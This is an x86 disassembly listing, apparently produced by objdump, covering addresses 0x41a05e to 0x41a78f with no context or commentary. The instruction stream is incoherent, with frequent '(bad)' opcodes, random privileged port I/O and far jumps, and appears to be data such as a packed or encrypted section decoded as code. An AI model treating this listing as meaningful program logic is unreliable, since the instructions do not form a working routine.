  41a05e:	es aam 0xc8
  41a061:	jbe    0x41a090
  41a063:	sar    BYTE PTR [esp+edi*2-0x1b],1
  41a067:	rcr    DWORD PTR [edi+0x1],cl
  41a06a:	mov    ah,0x14
  41a06c:	pop    ecx
  41a06d:	jmp    0xa0fe8af
  41a072:	imul   ecx,edx,0x7180299f
  41a078:	sub    cl,dh
  41a07a:	jo     0x41a01c
  41a07c:	arpl   WORD PTR [eax-0x34],si
  41a07f:	hlt    
  41a080:	sbb    DWORD PTR [esi+0x7f],esp
  41a083:	test   eax,0x1b57718e
  41a088:	inc    esp
  41a089:	mov    esi,DWORD PTR [esi]
  41a08b:	mov    BYTE PTR [edx+ebp*2+0x65e36241],al
  41a092:	pushf  
  41a093:	or     al,0x50
  41a095:	xor    DWORD PTR [edi],esp
  41a097:	push   esp
  41a098:	cli    
  41a099:	sub    DWORD PTR [edx+0x21],ecx
  41a09c:	jb     0x41a0fd
  41a09e:	push   es
  41a09f:	or     eax,0xc0a3fc81
  41a0a4:	mov    edi,edi
  41a0a6:	xor    eax,0x5a2695d6
  41a0ab:	neg    BYTE PTR [ebp+0x2b084d04]
  41a0b1:	sub    al,0x0
  41a0b3:	retf   
  41a0b4:	fdivr  QWORD PTR [edx-0x11]
  41a0b7:	test   BYTE PTR [edi],bl
  41a0b9:	xchg   ebp,eax
  41a0ba:	or     dl,dh
  41a0bc:	arpl   WORD PTR [ebx+eiz*8],si
  41a0bf:	test   DWORD PTR [edx],esi
  41a0c1:	xchg   esi,esi
  41a0c3:	mov    ebp,esp
  41a0c5:	ss add eax,0x910dd6b6
  41a0cb:	dec    ecx
  41a0cc:	mov    al,0xcc
  41a0ce:	(bad)  
  41a0cf:	mov    ebp,0x7ece930a
  41a0d4:	adc    eax,0x7bdaafb6
  41a0d9:	push   ebx
  41a0da:	test   DWORD PTR [ebx+eax*1+0x2d477af3],esp
  41a0e1:	mov    esp,0x6974b0f2
  41a0e6:	push   ss
  41a0e7:	jbe    0x41a0dc
  41a0e9:	test   BYTE PTR [esi+0x74],dh
  41a0ec:	xor    bh,BYTE PTR [ebp-0x69566038]
  41a0f2:	ins    BYTE PTR es:[edi],dx
  41a0f3:	mov    ah,BYTE PTR [edx]
  41a0f5:	mov    cl,0x69
  41a0f7:	(bad)  
  41a0f8:	scas   eax,DWORD PTR es:[edi]
  41a0f9:	int3   
  41a0fa:	scas   al,BYTE PTR es:[edi]
  41a0fb:	sbb    ecx,DWORD PTR [esi]
  41a0fd:	add    ebx,DWORD PTR [ebx-0x447e5e21]
  41a103:	xlat   BYTE PTR ds:[ebx]
  41a104:	inc    ebp
  41a105:	int    0xad
  41a107:	jb     0x41a0e5
  41a109:	jecxz  0x41a163
  41a10b:	xchg   esi,eax
  41a10c:	das    
  41a10d:	jle    0x41a11d
  41a10f:	mov    eax,0x6c4f9c13
  41a114:	xor    al,0x24
  41a116:	fstp   QWORD PTR [ecx+0x77]
  41a119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a11a:	pop    esi
  41a11b:	or     BYTE PTR [ebx+0x78bd6dd3],ch
  41a121:	sahf   
  41a122:	mov    WORD PTR [eax+0x6f],gs
  41a125:	push   cs
  41a126:	in     al,dx
  41a127:	and    ah,ah
  41a129:	lea    ecx,[ebx+eax*1+0xc]
  41a12d:	inc    eax
  41a12e:	ja     0x41a175
  41a130:	stos   DWORD PTR es:[edi],eax
  41a131:	stos   DWORD PTR es:[edi],eax
  41a132:	outs   dx,BYTE PTR ds:[esi]
  41a133:	mov    edx,DWORD PTR [edi-0x5f586892]
  41a139:	out    dx,eax
  41a13a:	lahf   
  41a13b:	test   eax,0xa0f4af57
  41a140:	loop   0x41a10f
  41a142:	dec    edx
  41a143:	sub    eax,0x66a59155
  41a148:	in     al,dx
  41a149:	adc    al,0xf9
  41a14b:	cli    
  41a14c:	retf   
  41a14d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a14e:	out    0xd1,al
  41a150:	ins    BYTE PTR es:[edi],dx
  41a151:	lods   al,BYTE PTR es:[esi]
  41a153:	cmp    edx,DWORD PTR [edi+0x64029ee2]
  41a159:	sub    DWORD PTR [esi-0x76],ecx
  41a15c:	jnp    0x41a0f7
  41a15e:	mov    esp,0x5c1ad409
  41a163:	dec    ebp
  41a164:	sub    eax,0xfbbcbe82
  41a169:	jge    0x41a108
  41a16b:	xchg   esi,eax
  41a16c:	mov    al,0x0
  41a16e:	fstp   DWORD PTR [esi+0x12]
  41a171:	imul   eax,DWORD PTR [esi+0x69397420],0xffffffcf
  41a178:	fisttp DWORD PTR [eax]
  41a17a:	addr16 jmp 0x6f34ef4f
  41a180:	xor    dl,cl
  41a182:	adc    al,BYTE PTR [edi-0x2b]
  41a185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a186:	icebp  
  41a187:	dec    edi
  41a188:	imul   DWORD PTR [edi-0x66cbcf]
  41a18e:	sub    ah,BYTE PTR [esi]
  41a190:	imul   edi,DWORD PTR [edx-0x42],0x2f310e7c
  41a197:	push   ebx
  41a198:	mov    ds:0xd29228cd,eax
  41a19d:	das    
  41a19e:	je     0x41a131
  41a1a0:	pop    esi
  41a1a1:	push   ss
  41a1a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1a3:	push   ebp
  41a1a4:	sbb    ebx,DWORD PTR [ebp-0x6997b170]
  41a1aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1ab:	aad    0xab
  41a1ad:	retf   
  41a1ae:	pop    ebp
  41a1af:	or     eax,0x97ac3cfd
  41a1b4:	mov    dl,0x9c
  41a1b6:	dec    ebp
  41a1b7:	add    esp,ebx
  41a1b9:	ins    BYTE PTR es:[edi],dx
  41a1ba:	jecxz  0x41a18b
  41a1bc:	and    eax,0xe6f6dcc3
  41a1c1:	fisttp QWORD PTR [edi-0x63]
  41a1c4:	jle    0x41a22f
  41a1c6:	adc    DWORD PTR [esi],0x8
  41a1c9:	lods   al,BYTE PTR ds:[esi]
  41a1ca:	cmp    DWORD PTR [ebp+0x5f],ebp
  41a1cd:	jo     0x41a205
  41a1cf:	jge    0x41a23e
  41a1d1:	or     BYTE PTR [ebp+0x4df96ee9],al
  41a1d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1d8:	std    
  41a1d9:	xchg   edi,eax
  41a1da:	hlt    
  41a1db:	sbb    DWORD PTR [ecx+0x39],0x70
  41a1df:	and    eax,0x686eb254
  41a1e4:	out    dx,al
  41a1e5:	lahf   
  41a1e6:	ret    0x7ef1
  41a1e9:	mul    BYTE PTR [esi]
  41a1eb:	sbb    edx,DWORD PTR [ebx]
  41a1ed:	leave  
  41a1ee:	add    ah,dh
  41a1f0:	jg     0x41a19b
  41a1f2:	pop    ebp
  41a1f3:	sahf   
  41a1f4:	dec    esi
  41a1f5:	or     eax,0xd986abe1
  41a1fa:	pop    edx
  41a1fb:	pop    edx
  41a1fc:	push   0x9
  41a1fe:	fsub   QWORD PTR [ebp-0x53]
  41a201:	sahf   
  41a202:	(bad)  
  41a203:	mov    esi,0x2699d88f
  41a208:	sub    bh,BYTE PTR [edi]
  41a20a:	mov    al,0x55
  41a20c:	retf   
  41a20d:	dec    edi
  41a20e:	mov    bl,0x7c
  41a210:	imul   edx,DWORD PTR [eax],0x15
  41a213:	xchg   ecx,eax
  41a214:	adc    BYTE PTR [eax+0x43c47240],cl
  41a21a:	lds    esi,FWORD PTR [ecx+eax*4]
  41a21d:	sub    eax,0x0
  41a222:	sbb    BYTE PTR [ebp+0xe],dl
  41a225:	add    eax,0x5d1b5f4f
  41a22a:	lods   eax,DWORD PTR ds:[esi]
  41a22b:	test   al,0x5b
  41a22d:	gs ds out dx,al
  41a230:	xchg   edi,eax
  41a231:	test   ch,0x1e
  41a234:	add    DWORD PTR [eax],eax
  41a236:	hlt    
  41a237:	add    al,0x0
  41a239:	add    BYTE PTR [esi],bh
  41a23b:	mov    edx,0x64dd53f7
  41a240:	add    BYTE PTR [edi+0x6141e1ba],ch
  41a246:	add    edi,DWORD PTR ds:0xee8170b1
  41a24c:	jb     0x41a244
  41a24e:	dec    ecx
  41a24f:	add    esp,ecx
  41a251:	add    BYTE PTR [ebp+0x66],bh
  41a254:	add    BYTE PTR [ecx+0x53],al
  41a257:	ret    
  41a258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a259:	stc    
  41a25a:	xchg   esp,eax
  41a25b:	out    0xfd,al
  41a25d:	push   0xf8e381f1
  41a262:	in     eax,0x28
  41a264:	dec    eax
  41a265:	add    ebx,DWORD PTR [ebp+0x65]
  41a268:	add    bl,cl
  41a26a:	js     0x41a20a
  41a26c:	dec    ecx
  41a26d:	jmp    0x41a25a
  41a26f:	pusha  
  41a270:	or     ah,bl
  41a272:	lahf   
  41a273:	out    dx,eax
  41a274:	sti    
  41a275:	and    eax,0xaf7533f2
  41a27a:	cmp    bl,BYTE PTR [eax-0x2d]
  41a27d:	dec    edx
  41a27e:	aad    0x22
  41a280:	xchg   edi,eax
  41a281:	push   edi
  41a282:	ds ss push ecx
  41a285:	xor    ebp,esi
  41a287:	mov    eax,0x3213f2b1
  41a28c:	cmp    BYTE PTR [edi],cl
  41a28e:	adc    al,0xf
  41a290:	call   0xee1bd540
  41a295:	push   0xfffffff4
  41a297:	test   bh,bl
  41a299:	xchg   edi,eax
  41a29a:	pop    ebp
  41a29b:	push   0x73e05a07
  41a2a0:	jmp    0x41a29f
  41a2a2:	pop    ebx
  41a2a3:	inc    esp
  41a2a4:	and    al,0x7b
  41a2a6:	and    BYTE PTR [edx-0x5c],ah
  41a2a9:	out    dx,al
  41a2aa:	iret   
  41a2ab:	push   ecx
  41a2ac:	push   esi
  41a2ad:	sbb    al,al
  41a2af:	and    eax,0xe0256a4f
  41a2b4:	mov    al,0x1b
  41a2b6:	xor    dh,cl
  41a2b8:	push   cs
  41a2b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2ba:	pushf  
  41a2bb:	addr16 xchg esp,eax
  41a2bd:	mov    ebp,edi
  41a2bf:	adc    esp,ebp
  41a2c1:	xchg   ecx,eax
  41a2c2:	jo     0x41a261
  41a2c4:	mov    esp,0x416430b8
  41a2c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2ca:	data16 sbb al,0xb3
  41a2cd:	lds    esi,FWORD PTR [eax+0x1eecb347]
  41a2d3:	jo     0x41a259
  41a2d5:	scas   eax,DWORD PTR es:[edi]
  41a2d6:	icebp  
  41a2d7:	lea    ebp,[esp+edx*1+0x1]
  41a2db:	fmul   QWORD PTR [ecx]
  41a2dd:	je     0x41a2b6
  41a2df:	mov    esi,0x57820b62
  41a2e4:	int    0xbd
  41a2e6:	and    BYTE PTR [esi],cl
  41a2e8:	loope  0x41a2ea
  41a2ea:	sbb    BYTE PTR [edi],bh
  41a2ec:	sub    BYTE PTR [edi+0x5206d82a],bh
  41a2f2:	xchg   ecx,eax
  41a2f3:	pop    edx
  41a2f4:	sbb    DWORD PTR [ebx+0x5e772312],edi
  41a2fa:	xor    eax,0xe05dd027
  41a2ff:	ret    
  41a300:	add    BYTE PTR [ebx+0x3f],0xc9
  41a304:	xor    al,0x75
  41a306:	shl    BYTE PTR [esi+eiz*2-0x7e3d24bb],1
  41a30d:	frstor [ecx-0x565eb38e]
  41a313:	push   0x8394062b
  41a318:	xchg   esi,eax
  41a319:	outs   dx,BYTE PTR ds:[esi]
  41a31a:	outs   dx,DWORD PTR ds:[esi]
  41a31b:	cdq    
  41a31c:	fdiv   DWORD PTR [eax-0x7840aa83]
  41a322:	sbb    bl,BYTE PTR ds:[ebp+0x545e2f37]
  41a329:	lahf   
  41a32a:	or     DWORD PTR [edx+0x73e97798],eax
  41a330:	dec    ecx
  41a331:	jne    0x41a314
  41a333:	push   ebx
  41a334:	mov    ecx,0x7f6cc515
  41a339:	or     eax,0x39d0aa79
  41a33e:	in     eax,0xc0
  41a340:	pop    esp
  41a341:	stc    
  41a342:	jmp    0xe35191fd
  41a347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a348:	pop    ebp
  41a349:	pop    esi
  41a34a:	cmp    ebx,DWORD PTR [edx-0x15]
  41a34d:	cli    
  41a34e:	ds push edx
  41a350:	xor    eax,0x73a9f9b6
  41a355:	fild   WORD PTR [ebp+0x53a2d388]
  41a35b:	xor    eax,DWORD PTR [edx]
  41a35d:	push   ds
  41a35e:	push   0x20f8d8e9
  41a363:	inc    esp
  41a364:	enter  0x6032,0xa
  41a368:	add    DWORD PTR [edx+0x3c],eax
  41a36b:	(bad)  
  41a36c:	mov    ebp,0x75ca3163
  41a371:	test   DWORD PTR [esi+0x6f9872cf],esp
  41a377:	out    0x83,eax
  41a379:	sti    
  41a37a:	cmc    
  41a37b:	pop    edx
  41a37c:	out    0xd,al
  41a37e:	xor    al,0xdd
  41a380:	mov    esi,0xb9549733
  41a385:	lahf   
  41a386:	stos   BYTE PTR es:[edi],al
  41a387:	cmp    DWORD PTR [esi+0xcd78d27],ebx
  41a38d:	and    DWORD PTR [edi-0x393a3621],edi
  41a393:	sub    BYTE PTR [esi],dl
  41a395:	cwde   
  41a396:	cwde   
  41a397:	ins    BYTE PTR es:[edi],dx
  41a398:	mov    gs,WORD PTR [bp+di+0x72]
  41a39c:	fst    QWORD PTR [ecx-0x702da784]
  41a3a2:	pop    esi
  41a3a3:	lods   eax,DWORD PTR ds:[esi]
  41a3a4:	and    dl,bh
  41a3a6:	and    eax,DWORD PTR [eax-0x2]
  41a3a9:	push   esp
  41a3aa:	pop    ebp
  41a3ab:	dec    esi
  41a3ac:	popa   
  41a3ad:	xor    ch,BYTE PTR [ebx]
  41a3af:	jns    0x41a3ca
  41a3b1:	popa   
  41a3b2:	fcom   DWORD PTR [eax+0x47]
  41a3b5:	call   DWORD PTR [edx+ebp*1]
  41a3b8:	or     ecx,DWORD PTR [ebx-0x1f]
  41a3bb:	mov    dl,0x50
  41a3bd:	push   0x968a03ff
  41a3c2:	pop    ebx
  41a3c3:	scas   al,BYTE PTR es:[edi]
  41a3c4:	sbb    BYTE PTR [esi+0x75],bh
  41a3c7:	stos   BYTE PTR es:[edi],al
  41a3c8:	out    0x26,eax
  41a3ca:	add    DWORD PTR [edi+0x192e3258],0xffffff8e
  41a3d1:	mov    DWORD PTR [edi-0x3c],ebx
  41a3d4:	xchg   ebx,eax
  41a3d5:	sub    cl,cl
  41a3d7:	push   ebx
  41a3d8:	push   edx
  41a3d9:	int3   
  41a3da:	mov    DWORD PTR [eax+0x30],0xf9959f44
  41a3e1:	dec    esp
  41a3e2:	dec    BYTE PTR [esi]
  41a3e4:	or     al,0x30
  41a3e6:	shr    DWORD PTR [edi+0x1a3c6c3d],0xbf
  41a3ed:	loop   0x41a432
  41a3ef:	out    0x7c,al
  41a3f1:	mov    edi,0x28bd0e24
  41a3f6:	sbb    eax,0x68e3c880
  41a3fb:	cwde   
  41a3fc:	cld    
  41a3fd:	out    dx,al
  41a3fe:	pop    ebx
  41a3ff:	sbb    ch,BYTE PTR [ebx+0x56]
  41a402:	push   esp
  41a403:	jmp    0x41a3a4
  41a405:	push   0x7c656377
  41a40a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a40b:	or     ah,BYTE PTR [ebx+0x33ed8f6b]
  41a411:	mov    dh,0x26
  41a413:	mov    esi,DWORD PTR [edi]
  41a415:	loope  0x41a432
  41a417:	loope  0x41a42e
  41a419:	jno    0x41a3cf
  41a41b:	jle    0x41a483
  41a41d:	mov    bh,BYTE PTR [ebp+0x45f30c3c]
  41a423:	mov    dh,0xdc
  41a425:	mov    esp,0x1b989833
  41a42a:	in     al,dx
  41a42b:	call   0x2f89:0x72ef38ce
  41a432:	xchg   edi,eax
  41a433:	xchg   ecx,eax
  41a434:	push   ebx
  41a435:	daa    
  41a436:	fdivrp st(1),st
  41a438:	inc    ebp
  41a439:	test   esi,ebp
  41a43b:	sub    ah,BYTE PTR [esi+0x5b]
  41a43e:	das    
  41a43f:	push   edi
  41a440:	lea    ecx,[edx-0x6c]
  41a443:	inc    ebx
  41a444:	out    dx,al
  41a445:	out    0x16,eax
  41a447:	and    DWORD PTR [edx+0x33],ebp
  41a44a:	mov    bh,BYTE PTR [eax+0x42687231]
  41a450:	mov    gs,WORD PTR [ebx+0x4d]
  41a453:	push   ds
  41a454:	mov    ch,bl
  41a456:	add    DWORD PTR [ebp+0x2b30bc9e],eax
  41a45c:	push   edx
  41a45d:	(bad)  
  41a45e:	or     ebx,esi
  41a460:	add    eax,0xffd20f4d
  41a465:	ret    0x547b
  41a468:	push   es
  41a469:	ror    ecx,cl
  41a46b:	adc    BYTE PTR [ebp+0x5f],bh
  41a46e:	and    eax,0x7e606888
  41a473:	lea    ebx,[ecx-0x38]
  41a476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a477:	das    
  41a478:	mov    dh,0x14
  41a47a:	call   0xa61a014d
  41a47f:	in     al,dx
  41a480:	sbb    ebp,eax
  41a482:	cmp    edi,DWORD PTR [edi+0x5b]
  41a485:	sub    eax,0x808cc346
  41a48a:	pop    ebx
  41a48b:	lds    ebp,FWORD PTR [esi-0x394f3203]
  41a491:	out    dx,al
  41a492:	xchg   esi,eax
  41a493:	les    esp,FWORD PTR [ebx+0x3c]
  41a496:	clc    
  41a497:	das    
  41a498:	cdq    
  41a499:	xchg   ebx,eax
  41a49a:	nop
  41a49b:	rol    BYTE PTR [edi-0x60],1
  41a49e:	add    esp,DWORD PTR [ecx]
  41a4a0:	push   ds
  41a4a1:	das    
  41a4a2:	pop    edi
  41a4a3:	ret    
  41a4a4:	add    eax,0x6789796d
  41a4a9:	pop    es
  41a4aa:	(bad)  
  41a4ab:	mov    eax,ds:0xf535be24
  41a4b0:	inc    ebp
  41a4b1:	test   BYTE PTR [esi-0x55d1371c],cl
  41a4b7:	or     DWORD PTR [edx],eax
  41a4b9:	adc    dh,cl
  41a4bb:	dec    edi
  41a4bc:	jno    0x41a49f
  41a4be:	mov    dh,cl
  41a4c0:	lds    ecx,FWORD PTR [esi+0x31]
  41a4c3:	push   eax
  41a4c4:	xor    al,0xab
  41a4c6:	pop    es
  41a4c7:	shl    BYTE PTR [ecx+0x31],cl
  41a4ca:	adc    eax,DWORD PTR [ebx-0x349b1941]
  41a4d0:	arpl   sp,ax
  41a4d2:	out    dx,al
  41a4d3:	xchg   esi,eax
  41a4d4:	lods   al,BYTE PTR ds:[esi]
  41a4d5:	and    al,0xc
  41a4d7:	cli    
  41a4d8:	call   0xf7f9:0x50e56b04
  41a4df:	add    ebx,esi
  41a4e1:	mov    BYTE PTR [edx+ecx*1-0x33a990d2],bh
  41a4e8:	das    
  41a4e9:	repz add edx,esp
  41a4ec:	pusha  
  41a4ed:	or     cl,BYTE PTR [esi]
  41a4ef:	push   cs
  41a4f0:	sub    ebp,eax
  41a4f2:	out    dx,eax
  41a4f3:	cmp    esi,DWORD PTR [ecx+0x5a019b5]
  41a4f9:	aas    
  41a4fa:	ss stos BYTE PTR es:[edi],al
  41a4fc:	and    BYTE PTR [esi],dl
  41a4fe:	int    0x69
  41a500:	(bad)  
  41a501:	fndisi(8087 only) 
  41a503:	xchg   esp,eax
  41a504:	das    
  41a505:	or     eax,0xc8caeb84
  41a50a:	imul   DWORD PTR [edx+0x15]
  41a50d:	imul   ebx,DWORD PTR [ebx-0x20],0xffffffe5
  41a511:	sbb    BYTE PTR [edi+0x29],ah
  41a514:	nop
  41a515:	cs bnd ret 0xa088
  41a51a:	mulps  xmm3,XMMWORD PTR [edx-0x1b]
  41a51e:	arpl   WORD PTR [eax-0x2],ax
  41a521:	or     ch,BYTE PTR [ecx+0x7e]
  41a524:	retf   
  41a525:	and    cl,BYTE PTR [edx]
  41a527:	add    DWORD PTR [esi-0x7249ba47],0x1bacb75e
  41a531:	jp     0x41a4fb
  41a533:	xchg   ebp,eax
  41a534:	(bad)  
  41a535:	mov    edi,0x1d1fda24
  41a53a:	in     eax,0xba
  41a53c:	cli    
  41a53d:	test   al,0x1d
  41a53f:	hlt    
  41a540:	xchg   DWORD PTR [esp+ebx*1-0x54451839],edx
  41a547:	jo     0x41a56c
  41a549:	out    dx,eax
  41a54a:	fisttp WORD PTR ds:0xd7edf036
  41a550:	lea    esi,[ebp+0x459bb0ab]
  41a556:	je     0x41a54b
  41a558:	mov    esp,0x33c44636
  41a55d:	ins    BYTE PTR es:[edi],dx
  41a55e:	jno    0x41a5d7
  41a560:	out    0x8,eax
  41a562:	mov    dl,0x17
  41a564:	lock sbb al,BYTE PTR [ebx]
  41a567:	sub    edi,DWORD PTR [edi-0x1f]
  41a56a:	popf   
  41a56b:	mov    dh,BYTE PTR [edi+0x22]
  41a56e:	xchg   bh,bl
  41a570:	mov    ds,WORD PTR ds:0x9c9ac34a
  41a576:	fimul  WORD PTR [ecx]
  41a578:	push   ebx
  41a579:	mov    edi,0x2fd9f239
  41a57e:	enter  0xd16c,0xcd
  41a582:	and    ebp,DWORD PTR [esi-0x69]
  41a585:	outs   dx,BYTE PTR ds:[esi]
  41a586:	adc    eax,0xf17545b7
  41a58b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a58c:	in     al,0xec
  41a58e:	xor    eax,0xb86423ad
  41a593:	xchg   DWORD PTR [edx],eax
  41a595:	xor    bl,BYTE PTR [ebp-0x34]
  41a598:	jl     0x41a58e
  41a59a:	rcr    BYTE PTR [edi+0x36],1
  41a59d:	xor    eax,DWORD PTR [edx-0x1f]
  41a5a0:	(bad)
  41a5a3:	outs   dx,DWORD PTR ds:[esi]
  41a5a4:	lods   al,BYTE PTR ds:[esi]
  41a5a5:	into   
  41a5a6:	fcomp  DWORD PTR [ebx]
  41a5a8:	mov    bh,0xd1
  41a5aa:	mov    al,ds:0x9109e83c
  41a5af:	mov    bl,0xe3
  41a5b1:	mov    ds:0xda187239,al
  41a5b6:	xlat   BYTE PTR ds:[ebx]
  41a5b7:	ret    
  41a5b8:	add    eax,ecx
  41a5ba:	mov    esi,0xba574219
  41a5bf:	stos   BYTE PTR es:[edi],al
  41a5c0:	outs   dx,DWORD PTR ds:[esi]
  41a5c1:	arpl   cx,bx
  41a5c3:	push   edx
  41a5c4:	mov    dh,0x67
  41a5c6:	in     eax,dx
  41a5c7:	mov    DWORD PTR [ebp+0x7841bd53],ebx
  41a5cd:	sbb    bh,BYTE PTR [ecx]
  41a5cf:	bound  edx,QWORD PTR [ebx]
  41a5d1:	lods   al,BYTE PTR ds:[esi]
  41a5d2:	dec    ebp
  41a5d3:	sahf   
  41a5d4:	push   eax
  41a5d5:	pop    esi
  41a5d6:	test   DWORD PTR [ecx],edx
  41a5d8:	test   eax,0x385e29d8
  41a5dd:	in     eax,dx
  41a5de:	sub    al,0x2f
  41a5e0:	rcr    al,1
  41a5e2:	mov    edx,0xdb1f099d
  41a5e7:	ret    
  41a5e8:	pop    es
  41a5e9:	fs pop ecx
  41a5eb:	add    dh,cl
  41a5ed:	ret    
  41a5ee:	push   ebx
  41a5ef:	sub    DWORD PTR es:[ebp-0x51],ebx
  41a5f3:	sub    dh,bl
  41a5f5:	js     0x41a62f
  41a5f7:	jnp    0x41a5f6
  41a5f9:	sub    eax,0x7ee217fd
  41a5fe:	jae    0x41a67f
  41a600:	jno    0x41a5c6
  41a602:	or     al,0xbb
  41a604:	xchg   ecx,eax
  41a605:	add    DWORD PTR [ecx+0x9bc3d4a],eax
  41a60b:	mov    edx,DWORD PTR [edi]
  41a60d:	fisub  WORD PTR [ebp-0x36d9a1ae]
  41a613:	stos   BYTE PTR es:[edi],al
  41a614:	xchg   esi,eax
  41a615:	mov    esp,0x2a506d5f
  41a61a:	lods   eax,DWORD PTR ds:[esi]
  41a61b:	inc    edi
  41a61c:	mov    dl,0x13
  41a61e:	leave  
  41a61f:	inc    eax
  41a620:	and    DWORD PTR [esi+edi*2-0x3a],ecx
  41a624:	mov    al,0x9
  41a626:	cmp    eax,0xb61675dd
  41a62b:	int3   
  41a62c:	popf   
  41a62d:	not    DWORD PTR [edx+0x525bc7ed]
  41a633:	iret   
  41a634:	inc    esp
  41a635:	push   ecx
  41a636:	ror    DWORD PTR [esi-0x7c],0xbc
  41a63a:	in     eax,0xef
  41a63c:	dec    ecx
  41a63d:	stc    
  41a63e:	xor    DWORD PTR [ebx],0x1a
  41a641:	sbb    dl,cl
  41a643:	dec    ebx
  41a644:	cmp    ah,BYTE PTR [ecx-0x6c14edbb]
  41a64a:	add    BYTE PTR [ebx],ch
  41a64c:	pop    ebp
  41a64d:	xor    DWORD PTR [esp+ecx*2+0x47],ebx
  41a651:	es gs jne 0x41a6b1
  41a655:	cmp    ecx,DWORD PTR [esi-0x46b62aeb]
  41a65b:	bound  ebp,QWORD PTR [eax-0x6b]
  41a65e:	inc    edx
  41a65f:	loope  0x41a632
  41a661:	fucomi st,st(2)
  41a663:	dec    ebp
  41a664:	inc    ecx
  41a665:	pop    eax
  41a666:	adc    al,0x81
  41a668:	and    ah,ch
  41a66a:	or     DWORD PTR [eax],edx
  41a66c:	lahf   
  41a66d:	fucomp st(1)
  41a66f:	push   esp
  41a670:	test   BYTE PTR [edx+0x54],bh
  41a673:	into   
  41a674:	and    edx,DWORD PTR [edx-0x76ba6fcf]
  41a67a:	xor    DWORD PTR [edi+0x79],ecx
  41a67d:	gs jmp 0xfb8a:0xe57fa838
  41a685:	pusha  
  41a686:	stos   DWORD PTR es:[edi],eax
  41a687:	and    ah,0x35
  41a68a:	loope  0x41a647
  41a68c:	dec    ebx
  41a68d:	pop    ss
  41a68e:	jae    0x41a706
  41a690:	pusha  
  41a691:	retf   
  41a692:	pop    edx
  41a693:	test   al,0xb9
  41a695:	adc    DWORD PTR [eax-0x316d3e5e],edx
  41a69b:	or     DWORD PTR [esi-0xf02fb6],ebx
  41a6a1:	js     0x41a6a3
  41a6a3:	sbb    BYTE PTR [edi],dl
  41a6a5:	(bad)  
  41a6a6:	lods   eax,DWORD PTR ds:[esi]
  41a6a7:	dec    eax
  41a6a8:	jge    0x41a698
  41a6aa:	push   edx
  41a6ab:	sar    eax,0x4c
  41a6ae:	xor    BYTE PTR [ebx-0x3e],0xe5
  41a6b2:	add    eax,0x42f9c82f
  41a6b7:	rcl    BYTE PTR [ebp-0x33],1
  41a6ba:	into   
  41a6bb:	and    eax,DWORD PTR [ecx+0x5e]
  41a6be:	out    dx,eax
  41a6bf:	cmc    
  41a6c0:	xchg   ebp,eax
  41a6c1:	mov    ds:0x80be055b,eax
  41a6c6:	ret    
  41a6c7:	in     eax,dx
  41a6c8:	adc    ah,BYTE PTR [ebp-0x67]
  41a6cb:	mov    esp,0x2661d510
  41a6d0:	jmp    0xf8f92fa4
  41a6d5:	fwait
  41a6d6:	cmc    
  41a6d7:	push   ebp
  41a6d8:	jne    0x41a6b0
  41a6da:	inc    esi
  41a6db:	loope  0x41a6b8
  41a6dd:	cmp    eax,0xe89d6b22
  41a6e2:	mov    esp,0x63a3e0b7
  41a6e7:	sub    ah,BYTE PTR [ebp-0x24ff11d0]
  41a6ed:	push   ss
  41a6ee:	lods   eax,DWORD PTR ds:[esi]
  41a6ef:	xor    ebp,DWORD PTR [edi]
  41a6f1:	mov    edi,0x4ccfacb1
  41a6f6:	cmp    dl,BYTE PTR [ebx-0x4e]
  41a6f9:	fadd   st,st(2)
  41a6fb:	push   ss
  41a6fc:	sti    
  41a6fd:	popf   
  41a6fe:	ret    
  41a6ff:	fcmovbe st,st(7)
  41a701:	je     0x41a6db
  41a703:	rcr    eax,1
  41a705:	scas   al,BYTE PTR es:[edi]
  41a706:	and    eax,0xb8f4e880
  41a70b:	test   eax,0x48d8d457
  41a710:	test   BYTE PTR [edx+0x137c445f],0x56
  41a717:	xor    bl,BYTE PTR [ebp-0x2]
  41a71a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a71b:	mov    dh,0x42
  41a71d:	jecxz  0x41a6f5
  41a71f:	imul   ebp,DWORD PTR [edi-0x9],0x209fccac
  41a726:	ja     0x41a6c8
  41a728:	mov    eax,ds:0xac5b0037
  41a72d:	add    BYTE PTR [eax],al
  41a72f:	add    BYTE PTR [eax],al
  41a731:	add    BYTE PTR [esi+0x6f],cl
  41a734:	je     0x41a75e
  41a736:	jne    0x41a773
  41a738:	pop    esi
  41a739:	outs   dx,DWORD PTR ds:[esi]
  41a73a:	out    dx,eax
  41a73b:	aaa    
  41a73c:	jae    0x41a716
  41a73e:	pop    esi
  41a73f:	push   esi
  41a740:	jb     0x41a7c1
  41a742:	mov    ecx,0xf4000123
  41a747:	add    al,0x0
  41a749:	add    BYTE PTR [edi],ah
  41a74b:	sbb    DWORD PTR [esp+ebx*4+0x1c],eax
  41a74f:	in     al,0xa8
  41a751:	mov    ds:0x45263cde,eax
  41a756:	add    DWORD PTR [esi-0x5b],ebx
  41a759:	aas    
  41a75a:	jo     0x41a6fb
  41a75c:	inc    eax
  41a75d:	sbb    ah,BYTE PTR [ebp+ebp*8-0x5c]
  41a761:	jle    0x41a7a8
  41a763:	int3   
  41a764:	mov    bl,0x2d
  41a766:	sub    al,ch
  41a768:	jnp    0x41a78a
  41a76a:	and    ecx,DWORD PTR gs:[ebp-0x55]
  41a76e:	xor    al,dh
  41a770:	or     al,BYTE PTR [edi-0x74a38cd6]
  41a776:	sbb    DWORD PTR [esi-0x3c],ecx
  41a779:	jmp    0xfd1dc86f
  41a77e:	mov    cl,0xe1
  41a780:	mov    al,ds:0xb8ef6862
  41a785:	loop   0x41a76a
  41a787:	pop    ss
  41a788:	jmp    0xfc879e75
  41a78d:	pop    esp
  41a78e:	push   ebx
  41a78f:	jo     0x41a747
